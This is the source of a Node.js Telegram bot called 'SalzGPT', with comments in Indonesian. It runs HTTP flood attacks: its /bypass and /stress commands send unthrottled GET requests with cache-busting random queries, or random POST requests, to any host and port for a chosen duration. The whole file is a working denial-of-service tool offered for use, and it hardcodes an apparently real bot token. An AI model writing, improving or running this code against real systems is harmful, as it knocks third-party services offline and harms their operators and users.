// SalzGPT - Node.js Telegram Bot v2.0
// Protokol Serangan: Ditingkatkan

const TelegramBot = require('node-telegram-bot-api');
const http = require('http');
const crypto = require('crypto'); // Untuk data acak

// --- KONFIGURASI ---
const BOT_TOKEN = "8522639108:AAGFgk9CHoKX9Owgu1sj1o9PAYZOZdDEnUI"; // Ganti dengan token bot Anda

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// --- FUNGSI SERANGAN YANG DITINGKATKAN ---

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
];

/**
 * Metode BYPASS: Menghindari cache dengan query acak.
 * @param {string} targetIp - IP atau Hostname target.
 * @param {number} targetPort - Port target.
 * @param {number} duration - Durasi serangan dalam detik.
 */
function bypassFlood(targetIp, targetPort, duration) {
    const attackInterval = setInterval(() => {
        const randomQuery = Math.random().toString(36).substring(2);
        const options = {
            hostname: targetIp,
            port: targetPort,
            path: `/?${randomQuery}`,
            method: 'GET',
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'close'
            }
        };

        const req = http.request(options, (res) => {});
        req.on('error', (err) => {});
        req.end();
    });

    setTimeout(() => {
        clearInterval(attackInterval);
    }, duration * 1000);
}

/**
 * Metode STRESS: Membanjiri dengan permintaan POST yang intensif.
 * @param {string} targetIp - IP atau Hostname target.
 * @param {number} targetPort - Port target.
 * @param {number} duration - Durasi serangan dalam detik.
 */
function stressFlood(targetIp, targetPort, duration) {
    const attackInterval = setInterval(() => {
        const postData = crypto.randomBytes(16).toString('hex'); // Data acak
        const options = {
            hostname: targetIp,
            port: targetPort,
            
            path: '/',
            method: 'POST',
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Connection': 'close'
            }
        };

        const req = http.request(options, (res) => {});
        req.on('error', (err) => {});
        req.write(postData);
        req.end();
    });

    setTimeout(() => {
        clearInterval(attackInterval);
    }, duration * 1000);
}

// --- HANDLER PERINTAH TELEGRAM ---

bot.onText(/\/start|\/help/, (msg) => {
    const chatId = msg.chat.id;
    const response = `
[SalzGPT] Sistem Operasional v2.0. Metode serangan telah ditingkatkan.
Perintah yang tersedia:
/bypass <HOST/IP> <PORT> <DURASI_DETIK>
   └ Menghindari cache server.

/stress <HOST/IP> <PORT> <DURASI_DETIK>
   └ Memberi beban pada CPU/aplikasi server.
    `;
    bot.sendMessage(chatId, response);
});

function handleAttackCommand(msg, match, attackFunction) {
    const chatId = msg.chat.id;
    if (!match || match.length < 4) {
        bot.sendMessage(chatId, `Format parameter salah.`);
        return;
    }
    const host = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);

    bot.sendMessage(chatId, `[${attackFunction.name.toUpperCase()}] Inisiasi serangan terhadap ${host}:${port} selama ${duration} detik.`);
    attackFunction(host, port, duration);
}

bot.onText(/\/bypass (\S+) (\d+) (\d+)/, (msg, match) => {
    handleAttackCommand(msg, match, bypassFlood);
});

bot.onText(/\/stress (\S+) (\d+) (\d+)/, (msg, match) => {
    handleAttackCommand(msg, match, stressFlood);
});

// --- Mulai Bot ---
console.log("[SalzGPT] Bot v2.0 sedang online. Menunggu perintah...");

